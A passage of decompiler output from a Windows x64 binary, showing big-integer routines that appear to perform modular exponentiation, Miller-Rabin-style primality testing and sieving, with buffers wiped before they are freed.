      sub_14003C0E0((__int64)&v103, 2);
      sub_14003C670(v7 + 80, (__int64)&v103);
      v34 = v102;
      memset(v102, 0, 8 * v104);
      free(v34);
      while ( (unsigned int)sub_14005DC30(v7 + 80, v7) != 1 )
        sub_14003CDE0(v7 + 80);
    }
    else
    {
      sub_14003C0E0((__int64)&v103, 3);
      sub_14003C670(v7 + 80, (__int64)&v103);
      v35 = v102;
      memset(v102, 0, 8 * v104);
      free(v35);
      while ( 1 )
      {
        sub_14003C0E0((__int64)&v100, 4);
        v36 = v8 | 1;
        vars0 = v36;
        v37 = sub_1400246E0((__int64)&v118, v7 + 80);
        v36 |= 2u;
        vars0 = v36;
        v38 = sub_140024710((__int64)&v112, v37, (__int64)&v100);
        v8 = v36 | 4;
        vars0 = v8;
        v41 = 0;
        if ( (unsigned int)sub_14005DC30(v38, v7) == -1 )
        {
          sub_14003C0E0((__int64)&v103, 2);
          v39 = v8 | 8;
          vars0 = v39;
          v40 = sub_14005DDF0((__int64)&v115, v7 + 40, v7 + 80, v7);
          v8 = v39 | 0x10;
          vars0 = v8;
          if ( !(unsigned int)sub_140045A60(v40, (__int64)&v103) )
            v41 = 1;
        }
        if ( v8 & 0x10 )
        {
          v8 &= 0xFFFFFFEF;
          vars0 = v8;
          v42 = v117;
          memset(v117, 0, 8 * v116);
          free(v42);
        }
        if ( v8 & 8 )
        {
          v8 &= 0xFFFFFFF7;
          vars0 = v8;
          v43 = v102;
          memset(v102, 0, 8 * v104);
          free(v43);
        }
        if ( v8 & 4 )
        {
          v8 &= 0xFFFFFFFB;
          vars0 = v8;
          v44 = v114;
          memset(v114, 0, 8 * v113);
          free(v44);
        }
        if ( v8 & 2 )
        {
          v8 &= 0xFFFFFFFD;
          vars0 = v8;
          v45 = v120;
          memset(v120, 0, 8 * v119);
          free(v45);
        }
        if ( v8 & 1 )
        {
          v8 &= 0xFFFFFFFE;
          v46 = v102;
          memset(v102, 0, 8 * v101);
          free(v46);
        }
        if ( v41 )
          break;
        sub_14003CDE0(v7 + 80);
      }
    }
    v47 = v105;
    memset(v105, 0, 8 * v104);
    free(v47);
    v48 = v129;
    v49 = v128;
  }
  else
  {
    sub_14004A6C0(&v130, (unsigned int)((_DWORD)retaddr - 1));
    sub_14003C0E0((__int64)&v127, 1);
    v50 = sub_14004A6C0(&v154, (unsigned int)retaddr);
    sub_140024710((__int64)&v115, v50, (__int64)&v127);
    v51 = v156;
    memset(v156, 0, 8 * v155);
    free(v51);
    v52 = v129;
    memset(v129, 0, 8 * v128);
    free(v52);
    sub_14004A6C0(&v112, (unsigned int)(v4 - 1));
    sub_14003C0E0((__int64)&v103, 1);
    v53 = sub_14004A6C0(&v157, v4);
    sub_140024710((__int64)&v118, v53, (__int64)&v103);
    v54 = v159;
    memset(v159, 0, 8 * v158);
    free(v54);
    memset(v102, 0, 8 * v104);
    free(v102);
    do
    {
      v55 = sub_140049E30();
      v56 = sub_14004C270();
      sub_14004AB20(v7 + 40, v5, (__int64)&v130, (__int64)&v115, 1, v56, v55);
      sub_14003C0E0((__int64)&v100, v6);
      v57 = sub_1400247D0((__int64)&v106, (__int64)&v100);
      v58 = (unsigned __int8)sub_14004AB20(v7, v5, (__int64)&v112, (__int64)&v118, 1, v57, v7 + 40) == 0;
      v59 = v108;
      memset(v108, 0, 8 * v107);
      free(v59);
      v60 = v102;
      memset(v102, 0, 8 * v101);
      free(v60);
    }
    while ( v58 );
    if ( v6 == 1 )
    {
      do
      {
        sub_14003C0E0((__int64)&v106, 2);
        sub_14003C0E0((__int64)&v100, 2);
        v61 = sub_140024710((__int64)&v136, v7, (__int64)&v106);
        v62 = sub_140049E30();
        v63 = sub_14004C270();
        sub_14003BED0(&v103, v5, (__int64)&v100, v61, 0, v63, v62);
        v64 = v138;
        memset(v138, 0, 8 * v137);
        free(v64);
        v65 = v102;
        memset(v102, 0, 8 * v101);
        free(v65);
        v66 = v108;
        memset(v108, 0, 8 * v107);
        free(v66);
        sub_14003C0E0((__int64)&v109, 1);
        v67 = sub_140024710((__int64)&v133, v7, (__int64)&v109);
        v68 = sub_140024770((__int64)&v121, v67, v7 + 40);
        v69 = sub_14004C4D0(&v124, (__int64)&v103, v68, v7);
        sub_14003C670(v7 + 80, (__int64)v69);
        v70 = v126;
        memset(v126, 0, 8 * v125);
        free(v70);
        v71 = v123;
        memset(v123, 0, 8 * v122);
        free(v71);
        v72 = v135;
        memset(v135, 0, 8 * v134);
        free(v72);
        v73 = v111;
        memset(v111, 0, 8 * v110);
        free(v73);
        v74 = v105;
        memset(v105, 0, 8 * v104);
        free(v74);
        sub_14003C0E0((__int64)&v100, 1);
        LOBYTE(v61) = (signed int)sub_140045A60(v7 + 80, (__int64)&v100) <= 0;
        v75 = v102;
        memset(v102, 0, 8 * v101);
        free(v75);
      }
      while ( (_BYTE)v61 );
    }
    else
    {
      do
      {
        sub_14003C0E0((__int64)&v106, 1);
        sub_14003C0E0((__int64)&v100, 3);
        v76 = sub_140024710((__int64)&v133, v7, (__int64)&v106);
        v77 = sub_140049E30();
        v78 = sub_14004C270();
        sub_14003BED0(&v103, v5, (__int64)&v100, v76, 0, v78, v77);
        v79 = v135;
        memset(v135, 0, 8 * v134);
        free(v79);
        v80 = v102;
        memset(v102, 0, 8 * v101);
        free(v80);
        v81 = v108;
        memset(v108, 0, 8 * v107);
        free(v81);
        sub_14003C0E0((__int64)&v109, 4);
        v82 = sub_1400246E0((__int64)&v124, (__int64)&v103);
        v83 = sub_140024710((__int64)&v121, v82, (__int64)&v109);
        LOBYTE(v76) = (unsigned int)sub_14005DC30(v83, v7) == 1;
        v84 = v123;
        memset(v123, 0, 8 * v122);
        free(v84);
        v85 = v126;
        memset(v126, 0, 8 * v125);
        free(v85);
        v86 = v111;
        memset(v111, 0, 8 * v110);
        free(v86);
        if ( !(_BYTE)v76 )
        {
          sub_14003C0E0((__int64)&v109, 1);
          v87 = sub_140024740((__int64)&v136, v7);
          v88 = sub_140024770((__int64)&v124, v87, v7 + 40);
          v89 = sub_14005DDF0((__int64)&v121, v88, (__int64)&v103, v7);
          sub_14003C670(v7 + 80, v89);
          v90 = v123;
          memset(v123, 0, 8 * v122);
          free(v90);
          v91 = v126;
          memset(v126, 0, 8 * v125);
          free(v91);
          v92 = v138;
          memset(v138, 0, 8 * v137);
          free(v92);
          v93 = v111;
          memset(v111, 0, 8 * v110);
          free(v93);
        }
        v94 = v105;
        memset(v105, 0, 8 * v104);
        free(v94);
        sub_14003C0E0((__int64)&v100, 2);
        v95 = (signed int)sub_140045A60(v7 + 80, (__int64)&v100) <= 0;
        v96 = v102;
        memset(v102, 0, 8 * v101);
        free(v96);
      }
      while ( v95 );
    }
    v97 = v120;
    memset(v120, 0, 8 * v119);
    free(v97);
    v98 = v114;
    memset(v114, 0, 8 * v113);
    free(v98);
    v99 = v117;
    memset(v117, 0, 8 * v116);
    free(v99);
    v48 = Memory;
    v49 = v131;
  }
  memset(v48, 0, 8 * v49);
  free(v48);
}
// 14004A6C0: using guessed type __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD);
// 14005B8E0: using guessed type __int64 __fastcall sub_14005B8E0(_QWORD);
// 14005DC30: using guessed type __int64 __fastcall sub_14005DC30(_QWORD, _QWORD);

//----- (000000014005CFC0) ----------------------------------------------------
#error "14005D0CD: call analysis failed (funcsize=95)"

//----- (000000014005D120) ----------------------------------------------------
char __fastcall sub_14005D120(__int64 a1)
{
  __int64 v1; // r14
  char v2; // di
  __int64 v3; // rax
  unsigned __int16 *v4; // rbx
  __int64 v5; // rbp
  char v6; // r15
  bool v7; // si
  void *v8; // rdx
  unsigned __int16 v9; // r8
  signed __int64 v10; // r9
  signed __int64 v11; // rdi
  unsigned __int16 *v12; // rcx
  char v14; // [rsp+28h] [rbp-40h]
  __int64 v15; // [rsp+38h] [rbp-30h]
  void *Memory; // [rsp+40h] [rbp-28h]
  int v17; // [rsp+70h] [rbp+8h]

  v1 = a1;
  v2 = 0;
  v17 = 0;
  v3 = sub_14005E5A0(&v17);
  v4 = *(unsigned __int16 **)v3;
  v5 = (*(_QWORD *)(v3 + 8) - *(_QWORD *)v3) >> 1;
  v6 = 1;
  v7 = 0;
  if ( *(_DWORD *)(v1 + 32) != 1 && !sub_14003CDA0(v1) )
  {
    sub_14003C0E0((__int64)&v14, v4[(unsigned int)(v5 - 1)]);
    v2 = 1;
    v17 = 1;
    if ( (signed int)sub_140045A60(v1, (__int64)&v14) <= 0 )
      v7 = 1;
  }
  if ( v2 & 1 )
  {
    v8 = Memory;
    memset(Memory, 0, 8 * v15);
    free(v8);
  }
  if ( !v7 )
    return 0;
  v9 = sub_140045B70(v1);
  v10 = (signed __int64)&v4[(unsigned int)v5];
  v11 = 2i64 * (unsigned int)v5 >> 1;
  while ( v11 > 0 )
  {
    v12 = &v4[v11 / 2];
    if ( *v12 >= v9 )
    {
      v11 /= 2i64;
    }
    else
    {
      v4 = v12 + 1;
      v11 += -1 - v11 / 2;
    }
  }
  if ( v4 == (unsigned __int16 *)v10 || v9 < *v4 )
    v6 = 0;
  return v6;
}
// 14005E5A0: using guessed type __int64 __fastcall sub_14005E5A0(_QWORD);

//----- (000000014005D790) ----------------------------------------------------
char __fastcall sub_14005D790(__int64 a1, __int64 a2)
{
  __int64 v2; // r13
  __int64 v3; // r12
  unsigned int v4; // er14
  int v5; // esi
  bool v6; // bl
  void *v7; // rdx
  signed int v8; // er15
  bool v9; // bl
  void *v10; // rdx
  void *v11; // rdx
  int v13; // esi
  __int64 v14; // rax
  char v15; // bl
  void *v16; // rdx
  void *v17; // rdx
  void *v18; // rdx
  void *v19; // rdx
  int v20; // esi
  bool v21; // bl
  void *v22; // rdx
  void *v23; // rdx
  void *v24; // rdx
  void *v25; // rdx
  signed int v26; // esi
  __int64 v27; // rax
  __int64 v28; // rax
  void *v29; // rdx
  void *v30; // rdx
  bool v31; // bl
  void *v32; // rdx
  void *v33; // rdx
  void *v34; // rdx
  void *v35; // rdx
  char v36; // [rsp+20h] [rbp-B8h]
  __int64 v37; // [rsp+30h] [rbp-A8h]
  void *Memory; // [rsp+38h] [rbp-A0h]
  char v39; // [rsp+48h] [rbp-90h]
  __int64 v40; // [rsp+58h] [rbp-80h]
  void *v41; // [rsp+60h] [rbp-78h]
  char v42; // [rsp+70h] [rbp-68h]
  __int64 v43; // [rsp+80h] [rbp-58h]
  void *v44; // [rsp+88h] [rbp-50h]
  char v45; // [rsp+98h] [rbp-40h]
  __int64 v46; // [rsp+A8h] [rbp-30h]
  void *v47; // [rsp+B0h] [rbp-28h]
  char v48; // [rsp+C0h] [rbp-18h]
  __int64 v49; // [rsp+D0h] [rbp-8h]
  void *v50; // [rsp+D8h] [rbp+0h]
  __int64 v51; // [rsp+E8h] [rbp+10h]
  int v52; // [rsp+138h] [rbp+60h]

  v51 = -2i64;
  v2 = a2;
  v3 = a1;
  v4 = 0;
  v5 = 0;
  v52 = 0;
  sub_14003C0E0((__int64)&v36, 3);
  v6 = (signed int)sub_140045A60(v3, (__int64)&v36) <= 0;
  v7 = Memory;
  memset(Memory, 0, 8 * v37);
  free(v7);
  if ( !v6 )
  {
    if ( !sub_140048010(v3, 0i64) )
    {
      sub_14003C0E0((__int64)&v36, 2);
      v5 = 4;
      v52 = 4;
      if ( (unsigned int)sub_140045A60(v3, (__int64)&v36) )
        goto LABEL_41;
    }
    sub_14003C0E0((__int64)&v42, 1);
    v13 = v5 | 8;
    v52 = v13;
    v14 = sub_14005C1D0((__int64)&v48);
    v5 = v13 | 0x10;
    v52 = v5;
    if ( (unsigned int)sub_140045A60(v14, (__int64)&v42) )
LABEL_41:
      v15 = 1;
    else
      v15 = 0;
    if ( v5 & 0x10 )
    {
      v5 &= 0xFFFFFFEF;
      v52 = v5;
      v16 = v50;
      memset(v50, 0, 8 * v49);
      free(v16);
    }
    if ( v5 & 8 )
    {
      v5 &= 0xFFFFFFF7;
      v52 = v5;
      v17 = v44;
      memset(v44, 0, 8 * v43);
      free(v17);
    }
    if ( v5 & 4 )
    {
      v5 &= 0xFFFFFFFB;
      v18 = Memory;
      memset(Memory, 0, 8 * v37);
      free(v18);
    }
    if ( !v15 )
    {
      sub_14003C0E0((__int64)&v42, 1);
      sub_140024710((__int64)&v42, v3, (__int64)&v42);
      v19 = v44;
      memset(v44, 0, 8 * v43);
      free(v19);
      if ( !sub_140048010((__int64)&v42, 0i64) )
      {
        do
          ++v4;
        while ( !sub_140048010((__int64)&v42, v4) );
      }
      sub_14003CA00((__int64)&v42, (__int64)&v45, v4);
      sub_14004C4D0(&v39, v2, (__int64)&v45, v3);
      sub_14003C0E0((__int64)&v36, 1);
      v20 = v5 | 0x20;
      v52 = v20;
      v21 = !(unsigned int)sub_140045A60((__int64)&v39, (__int64)&v36)
         || !(unsigned int)sub_140045A60((__int64)&v39, (__int64)&v42);
      if ( v20 & 0x20 )
      {
        v22 = Memory;
        memset(Memory, 0, 8 * v37);
        free(v22);
      }
      if ( v21 )
      {
LABEL_32:
        v23 = v41;
        memset(v41, 0, 8 * v40);
        free(v23);
        v24 = v47;
        memset(v47, 0, 8 * v46);
        free(v24);
        v25 = v41;
        memset(v41, 0, 8 * v40);
        free(v25);
        return 1;
      }
      v26 = 1;
      if ( v4 > 1 )
      {
        while ( 1 )
        {
          v27 = sub_140029020((__int64)&v39, (__int64)&v36);
          v28 = sub_1400247D0((__int64)&v48, v27);
          sub_14003C670((__int64)&v39, v28);
          v29 = v50;
          memset(v50, 0, 8 * v49);
          free(v29);
          v30 = Memory;
          memset(Memory, 0, 8 * v37);
          free(v30);
          if ( !(unsigned int)sub_140045A60((__int64)&v39, (__int64)&v42) )
            goto LABEL_32;
          sub_14003C0E0((__int64)&v36, 1);
          v31 = (unsigned int)sub_140045A60((__int64)&v39, (__int64)&v36) == 0;
          v32 = Memory;
          memset(Memory, 0, 8 * v37);
          free(v32);
          if ( !v31 && ++v26 < v4 )
            continue;
          break;
        }
      }
      v33 = v41;
      memset(v41, 0, 8 * v40);
      free(v33);
      v34 = v47;
      memset(v47, 0, 8 * v46);
      free(v34);
      v35 = v41;
      memset(v41, 0, 8 * v40);
      free(v35);
    }
    return 0;
  }
  sub_14003C0E0((__int64)&v42, 2);
  v8 = 1;
  v52 = 1;
  v9 = 1;
  if ( (unsigned int)sub_140045A60(v3, (__int64)&v42) )
  {
    sub_14003C0E0((__int64)&v36, 3);
    v8 = 3;
    v52 = 3;
    if ( (unsigned int)sub_140045A60(v3, (__int64)&v36) )
      v9 = 0;
  }
  if ( v8 & 2 )
  {
    v8 &= 0xFFFFFFFD;
    v52 = v8;
    v10 = Memory;
    memset(Memory, 0, 8 * v37);
    free(v10);
  }
  if ( v8 & 1 )
  {
    v11 = v44;
    memset(v44, 0, 8 * v43);
    free(v11);
  }
  return v9;
}

//----- (000000014005DDF0) ----------------------------------------------------
__int64 __fastcall sub_14005DDF0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdi
  __int64 v5; // r15
  __int64 v6; // rsi
  __int64 v7; // r14
  int v8; // ebx
  __int64 v9; // rax
  __int64 v10; // rax
  void *v11; // rdx
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  int v15; // ebx
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  char *v20; // rcx
  __int64 v21; // rax
  __int64 v22; // rax
  __int64 v23; // rax
  void *v24; // rdx
  void *v25; // rdx
  void *v26; // rdx
  void *v27; // rdx
  void *v28; // rdx
  void *v29; // rdx
  void *v30; // rdx
  void *v31; // rdx
  void *v32; // rdx
  char v34; // [rsp+28h] [rbp-C0h]
  __int64 v35; // [rsp+38h] [rbp-B0h]
  void *v36; // [rsp+40h] [rbp-A8h]
  char v37; // [rsp+50h] [rbp-98h]
  __int64 v38; // [rsp+60h] [rbp-88h]
  void *v39; // [rsp+68h] [rbp-80h]
  __int64 v40; // [rsp+70h] [rbp-78h]
  void *v41; // [rsp+78h] [rbp-70h]
  char v42; // [rsp+88h] [rbp-60h]
  __int64 v43; // [rsp+98h] [rbp-50h]
  void *v44; // [rsp+A0h] [rbp-48h]
  __int64 v45; // [rsp+B0h] [rbp-38h]
  char v46; // [rsp+B8h] [rbp-30h]
  __int64 v47; // [rsp+E0h] [rbp-8h]
  void *v48; // [rsp+E8h] [rbp+0h]
  __int64 v49; // [rsp+108h] [rbp+20h]
  void *v50; // [rsp+110h] [rbp+28h]
  __int64 v51; // [rsp+130h] [rbp+48h]
  void *v52; // [rsp+138h] [rbp+50h]
  __int64 v53; // [rsp+158h] [rbp+70h]
  void *v54; // [rsp+160h] [rbp+78h]
  __int64 v55; // [rsp+178h] [rbp+90h]
  void *v56; // [rsp+180h] [rbp+98h]
  char v57; // [rsp+188h] [rbp+A0h]
  __int64 v58; // [rsp+198h] [rbp+B0h]
  void *Memory; // [rsp+1A0h] [rbp+B8h]

  v45 = -2i64;
  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140045340(a2);
  if ( v8 )
  {
    sub_14003BA90(&v46, v4);
    v10 = sub_1400247D0((__int64)&v57, v5);
    sub_140025990((__int64)&v46, (__int64)&v41, v10);
    v11 = Memory;
    memset(Memory, 0, 8 * v58);
    free(v11);
    v12 = sub_14004C0A0();
    sub_140025990((__int64)&v46, (__int64)&v42, v12);
    sub_14003C000((__int64)&v34, (__int64)&v41);
    v13 = sub_14004B9F0(&v46, (__int64)&v41);
    v14 = sub_14004BF80((__int64)&v46, v13, (__int64)&v42);
    sub_14003C000((__int64)&v37, v14);
    v15 = v8 - 1;
    while ( v15 )
    {
      if ( sub_140048010(v6, (unsigned int)--v15) )
      {
        v16 = sub_140049840(&v46, (__int64)&v34, (__int64)&v37);
        v17 = sub_14004BF80((__int64)&v46, v16, (__int64)&v41);
        sub_14003C670((__int64)&v34, v17);
        v18 = sub_14004B9F0(&v46, (__int64)&v37);
        v19 = sub_14004BF80((__int64)&v46, v18, (__int64)&v42);
        v20 = &v37;
      }
      else
      {
        v21 = sub_140049840(&v46, (__int64)&v34, (__int64)&v37);
        v22 = sub_14004BF80((__int64)&v46, v21, (__int64)&v41);
        sub_14003C670((__int64)&v37, v22);
        v23 = sub_14004B9F0(&v46, (__int64)&v34);
        v19 = sub_14004BF80((__int64)&v46, v23, (__int64)&v42);
        v20 = &v34;
      }
      sub_14003C670((__int64)v20, v19);
    }
    sub_140045AA0(&v46, v7, (__int64)&v34);
    v24 = v39;
    memset(v39, 0, 8 * v38);
    free(v24);
    v25 = v36;
    memset(v36, 0, 8 * v35);
    free(v25);
    v26 = v44;
    memset(v44, 0, 8 * v43);
    free(v26);
    v27 = v41;
    memset(v41, 0, 8 * v40);
    free(v27);
    v28 = v56;
    memset(v56, 0, 8 * v55);
    free(v28);
    v29 = v54;
    memset(v54, 0, 8 * v53);
    free(v29);
    v30 = v52;
    memset(v52, 0, 8 * v51);
    free(v30);
    v31 = v50;
    memset(v50, 0, 8 * v49);
    free(v31);
    v32 = v48;
    memset(v48, 0, 8 * v47);
    free(v32);
  }
  else
  {
    v9 = sub_14004C0A0();
    sub_14003C000(v7, v9);
  }
  return v7;
}

//----- (000000014005E0E0) ----------------------------------------------------
char __fastcall sub_14005E0E0(__int64 a1, __int64 a2)
{
  __int64 v2; // rsi
  __int64 v3; // rbx
  _DWORD *v4; // r8
  signed __int64 v5; // rdi
  __int64 v6; // rax
  unsigned __int64 v7; // rdi
  __int64 v8; // r9
  unsigned __int64 v9; // rdx
  unsigned __int64 v10; // rcx
  _DWORD *v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  void *v14; // rdx
  void *v15; // rdx
  __int64 v17; // rax
  void *v18; // rdx
  void *v19; // rdx
  void *v20; // rdx
  __m128i v21; // [rsp+18h] [rbp-59h]
  char v22; // [rsp+28h] [rbp-49h]
  __int64 v23; // [rsp+38h] [rbp-39h]
  void *v24; // [rsp+40h] [rbp-31h]
  __m128i v25; // [rsp+58h] [rbp-19h]
  char v26; // [rsp+68h] [rbp-9h]
  __int64 v27; // [rsp+78h] [rbp+7h]
  void *Memory; // [rsp+80h] [rbp+Fh]
  __int64 v29; // [rsp+90h] [rbp+1Fh]
  char v30; // [rsp+98h] [rbp+27h]
  __int64 v31; // [rsp+A8h] [rbp+37h]
  void *v32; // [rsp+B0h] [rbp+3Fh]

  v29 = -2i64;
  v2 = a2;
  v3 = a1;
  v25.m128i_i64[1] = 0i64;
  while ( 1 )
  {
    v4 = *(_DWORD **)(v3 + 136);
    v5 = 0i64;
    v6 = *(_QWORD *)(v3 + 160);
    if ( v6 )
    {
      v7 = *(_QWORD *)(v3 + 160);
      if ( v6 < 0 && v6 )
        v4 = (_DWORD *)((char *)v4 - 4i64 - 4 * ((-1i64 - v7) >> 5));
      else
        v4 += v7 >> 5;
      v5 = *(_QWORD *)(v3 + 160) & 0x1Fi64;
    }
    v8 = *(_QWORD *)(v3 + 136);
    v25.m128i_i64[0] = *(_QWORD *)(v3 + 136);
    v9 = *(_QWORD *)(v3 + 128);
    _mm_store_si128(&v21, v25);
    if ( (v9 & 0x8000000000000000ui64) != 0i64 && v9 )
      v21.m128i_i64[0] = v8 - (4 * ((-1i64 - v9) >> 5) + 4);
    else
      v21.m128i_i64[0] = v8 + 4 * (v9 >> 5);
    v21.m128i_i64[1] = v9 & 0x1F;
    _mm_store_si128(&v21, v21);
    v10 = v21.m128i_u64[1];
    v11 = (_DWORD *)v21.m128i_i64[0];
    while ( (v11 != v4 || v10 != v5) && (1 << v10) & *v11 )
    {
      if ( v10 >= 0x1F )
      {
        v10 = 0i64;
        ++v11;
      }
      else
      {
        ++v10;
      }
    }
    *(_QWORD *)(v3 + 128) = v10 + 32 * (((signed __int64)v11 - v8) >> 2);
    v12 = *(_QWORD *)(v3 + 160);
    if ( *(_QWORD *)(v3 + 128) != v12 )
      break;
    sub_14003C0E0((__int64)&v22, v12);
    v13 = sub_1400246E0((__int64)&v26, (__int64)&v22);
    sub_14003D540(v3, v13);
    v14 = Memory;
    memset(Memory, 0, 8 * v27);
    free(v14);
    v15 = v24;
    memset(v24, 0, 8 * v23);
    free(v15);
    if ( (signed int)sub_140045A60(v3, v3 + 40) > 0 )
      return 0;
    *(_QWORD *)(v3 + 128) = 0i64;
    sub_14005B8E0(v3);
  }
  sub_14003C0E0((__int64)&v22, *(_DWORD *)(v3 + 128));
  sub_1400246E0((__int64)&v30, (__int64)&v22);
  v17 = sub_140024740((__int64)&v26, v3);
  sub_14003C670(v2, v17);
  v18 = Memory;
  memset(Memory, 0, 8 * v27);
  free(v18);
  v19 = v32;
  memset(v32, 0, 8 * v31);
  free(v19);
  v20 = v24;
  memset(v24, 0, 8 * v23);
  free(v20);
  ++*(_QWORD *)(v3 + 128);
  return 1;
}
// 14005B8E0: using guessed type __int64 __fastcall sub_14005B8E0(_QWORD);

//----- (000000014005E370) ----------------------------------------------------
char __fastcall sub_14005E370(__int64 a1, __int64 a2, unsigned int a3)
{
  unsigned int v3; // er14
  __int64 v4; // r15
  __int64 v5; // r12
  int v6; // ebx
  bool v7; // si
  void *v8; // rdx
  signed int v9; // ebx
  bool v10; // si
  void *v11; // rdx
  void *v12; // rdx
  char result; // al
  __int64 v14; // rax
  void *v15; // rdx
  void *v16; // rdx
  void *v17; // rdx
  void *v18; // rdx
  void *v19; // rdx
  char v20; // [rsp+0h] [rbp-79h]
  __int64 v21; // [rsp+10h] [rbp-69h]
  void *Memory; // [rsp+18h] [rbp-61h]
  char v23; // [rsp+28h] [rbp-51h]
  __int64 v24; // [rsp+38h] [rbp-41h]
  void *v25; // [rsp+40h] [rbp-39h]
  char v26; // [rsp+50h] [rbp-29h]
  __int64 v27; // [rsp+60h] [rbp-19h]
  void *v28; // [rsp+68h] [rbp-11h]
  __int64 v29; // [rsp+78h] [rbp-1h]
  char v30; // [rsp+80h] [rbp+7h]
  __int64 v31; // [rsp+90h] [rbp+17h]
  void *v32; // [rsp+98h] [rbp+1Fh]
  int vars0; // [rsp+F8h] [rbp+7Fh]

  v29 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v6 = 0;
  vars0 = 0;
  sub_14003C0E0((__int64)&v23, 3);
  v7 = (signed int)sub_140045A60(v4, (__int64)&v20) <= 0;
  v8 = Memory;
  memset(Memory, 0, 8 * v21);
  free(v8);
  if ( v7 )
  {
    sub_14003C0E0((__int64)&v23, 2);
    v9 = 1;
    vars0 = 1;
    v10 = 1;
    if ( (unsigned int)sub_140045A60(v4, (__int64)&v23) )
    {
      sub_14003C0E0((__int64)&v20, 3);
      v9 = 3;
      vars0 = 3;
      if ( (unsigned int)sub_140045A60(v4, (__int64)&v20) )
        v10 = 0;
    }
    if ( v9 & 2 )
    {
      v9 &= 0xFFFFFFFD;
      vars0 = v9;
      v11 = Memory;
      memset(Memory, 0, 8 * v21);
      free(v11);
    }
    if ( v9 & 1 )
    {
      v12 = v25;
      memset(v25, 0, 8 * v24);
      free(v12);
    }
    result = v10;
  }
  else
  {
    sub_14003C210(&v26);
    if ( v3 )
    {
      while ( 1 )
      {
        sub_14003C0E0((__int64)&v20, 2);
        sub_14003C0E0((__int64)&v23, 2);
        v14 = sub_140024710((__int64)&v30, v4, (__int64)&v20);
        sub_14004A820((__int64)&v26, v5, (__int64)&v23, v14);
        v15 = v32;
        memset(v32, 0, 8 * v31);
        free(v15);
        v16 = v25;
        memset(v25, 0, 8 * v24);
        free(v16);
        v17 = Memory;
        memset(Memory, 0, 8 * v21);
        free(v17);
        if ( !sub_14005D790(v4, (__int64)&v26) )
          break;
        if ( ++v6 >= v3 )
          goto LABEL_16;
      }
      v18 = v28;
      memset(v28, 0, 8 * v27);
      free(v18);
      result = 0;
    }
    else
    {
LABEL_16:
      v19 = v28;
      memset(v28, 0, 8 * v27);
      free(v19);
      result = 1;
    }
  }
  return result;
}

//----- (000000014005E8F0) ----------------------------------------------------
bool __fastcall sub_14005E8F0(__int64 a1, unsigned int a2)
{
  __int64 v2; // rbp
  unsigned __int64 v3; // rsi
  unsigned __int16 **v4; // rax
  unsigned __int16 *v5; // rdi
  __int64 v6; // rbx
  unsigned __int16 *v7; // r8
  bool result; // al
  char v9; // [rsp+48h] [rbp+10h]

  v2 = a1;
  v3 = a2;
  v4 = (unsigned __int16 **)sub_14005E5A0(&v9);
  v5 = *v4;
  LODWORD(v6) = 0;
  if ( **v4 >= (unsigned int)v3 )
  {
LABEL_5:
    if ( (_DWORD)v3 == v5[(unsigned int)v6] )
      result = sub_140049290(v2, v3) == 0;
    else
      result = 0;
  }
  else
  {
    v7 = *v4;
    while ( sub_140049290(v2, *v7) )
    {
      v6 = (unsigned int)(v6 + 1);
      v7 = &v5[v6];
      if ( *v7 >= (unsigned int)v3 )
        goto LABEL_5;
    }
    result = 1;
  }
  return result;
}
// 14005E5A0: using guessed type __int64 __fastcall sub_14005E5A0(_QWORD);

//----- (000000014005E980) ----------------------------------------------------
bool __fastcall sub_14005E980(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // rdi
  unsigned int v4; // esi
  __int64 v5; // rbx
  bool result; // al

  v3 = a1;
  v4 = a3;
  v5 = a2;
  result = (unsigned __int8)sub_14005CFC0(a2) && sub_14005E370(v3, v5, 1u);
  if ( v4 >= 1 )
    result = result && sub_14005E370(v3, v5, 0xAu);
  return result;
}

//----- (000000014005EA10) ----------------------------------------------------
char __fastcall sub_14005EA10(_QWORD *a1, unsigned __int64 a2, _DWORD *a3)
{
  _DWORD *v3; // rbx
  unsigned __int64 v4; // rdi
  _QWORD *v5; // rsi
  signed __int64 v6; // rax
  _DWORD *v7; // rcx
  unsigned __int64 v8; // r8
  _DWORD *i; // rdx

  v3 = a3;
  v4 = a2;
  v5 = a1;
  LOBYTE(v6) = sub_14004C280(a1, a2);
  if ( (_BYTE)v6 )
  {
    v7 = (_DWORD *)*v5;
    v8 = v4;
    for ( i = (_DWORD *)*v5; v8; --v8 )
    {
      *i = *v3;
      ++i;
    }
    v6 = (signed __int64)&v7[v4];
    v5[1] = v6;
  }
  return v6;
}

//----- (000000014005EA80) ----------------------------------------------------
__m128i *__fastcall sub_14005EA80(unsigned __int64 *a1, __m128i *a2, __int128 *a3, unsigned __int64 a4, _BYTE *a5)
{
  __m128i *v5; // r14
  unsigned __int64 v6; // rbx
  unsigned __int64 *v7; // r15
  signed __int64 v8; // rax
  unsigned __int64 v9; // r11
  unsigned __int64 v10; // r9
  signed __int64 v11; // r8
  _DWORD *v12; // rbx
  unsigned __int64 v13; // r9
  unsigned __int64 v14; // rcx
  _DWORD *v15; // rdx
  signed int v16; // eax
  __m128i *result; // rax
  __m128i v18; // [rsp+20h] [rbp-10h]

  v5 = a2;
  v6 = a4;
  v7 = a1;
  v18 = (__m128i)*a3;
  v8 = sub_14005EC40(a1, &v18, a4);
  v9 = *v7;
  v18 = (__m128i)*v7;
  v10 = v8 + v6;
  v11 = v8;
  _mm_store_si128(&v18, v18);
  if ( (signed __int64)(v8 + v6) < 0 && v10 )
    v12 = (_DWORD *)(-4i64 - 4 * ((-1i64 - v10) >> 5) + v18.m128i_i64[0]);
  else
    v12 = (_DWORD *)(v18.m128i_i64[0] + 4 * (v10 >> 5));
  v18 = (__m128i)v9;
  v13 = v10 & 0x1F;
  _mm_store_si128(&v18, (__m128i)v9);
  if ( v8 < 0 && v8 )
    v18.m128i_i64[0] += -4i64 - 4 * ((unsigned __int64)(-1 - v8) >> 5);
  else
    v18.m128i_i64[0] += 4 * ((unsigned __int64)v8 >> 5);
  v18.m128i_i64[1] = v8 & 0x1F;
  _mm_store_si128(&v18, v18);
  v14 = v18.m128i_u64[1];
  v15 = (_DWORD *)v18.m128i_i64[0];
